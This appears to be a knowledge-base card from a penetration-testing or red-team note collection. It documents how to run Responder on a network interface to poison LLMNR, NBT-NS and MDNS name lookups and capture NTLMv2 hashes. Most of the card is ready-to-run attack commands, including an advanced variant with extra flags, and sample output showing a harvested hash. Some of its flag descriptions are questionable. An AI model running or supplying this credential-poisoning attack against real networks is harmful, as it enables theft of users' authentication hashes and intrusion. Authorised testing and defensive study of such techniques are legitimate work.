---
type: command
executor: bash
data: responder -I $_INTERFACE -v
tags:
  - credential-access
  - ntlm-poisoning
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# responder-run-verbose-on-interface

## Command

```bash
responder -I $_INTERFACE -v
```

## Description

This command starts the Responder tool to perform LLMNR, NBT-NS, and MDNS poisoning on a specified network interface in verbose mode, capturing NTLM authentication attempts for hash extraction in attacks like SCF/URL file exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_INTERFACE | Network interface to bind to (e.g., eth0, wlan0) | Yes |
| -I | Flag to specify interface | Built-in |
| -v | Enable verbose output for detailed logging | Yes |

## Examples

### Basic Usage

```bash
responder -I eth0 -v
```

### Advanced Usage

```bash
responder -I eth0 -v -w -r -f
```
(Add -w for WPAD, -r for relay, -f for fingerprinting.)

## Expected Output

```
[+] Loading Responder Core modules
[+] Setup IPv6 listeners
[LLMNR]  Poisoners started on interface: eth0
[NBT-NS] Poisoners started on interface: eth0
[MDNS]   Poisoners started on interface: eth0
```

When a hash is captured:
```
[SMB] NTLMv2-SSP Client   : 192.168.1.50
[SMB] NTLMv2-SSP Hash     : ::-username:target:1122334455667788:...
```

## Related

- [[procedures/SCF-URL-File-Attack-Against-Writable-Share]]
- [[tools/Responder]]
